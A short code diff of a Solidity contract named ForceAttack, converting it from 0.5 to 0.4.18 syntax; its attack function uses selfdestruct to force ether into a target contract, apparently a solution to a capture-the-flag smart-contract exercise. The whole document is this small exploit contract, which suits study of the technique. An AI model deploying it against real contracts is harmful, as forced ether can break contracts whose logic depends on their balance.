@@ -1,11 +1,11 @@
-pragma solidity ^0.5.0;
+pragma solidity ^0.4.18;
 
 contract ForceAttack {
 
-  constructor() public payable {}
-  function() external payable {}
+  function ForceAttack() public payable {}
+  function() public payable {}
 
-  function attack(address payable target) public {
+  function attack(address target) public {
     selfdestruct(target);
   }
 }
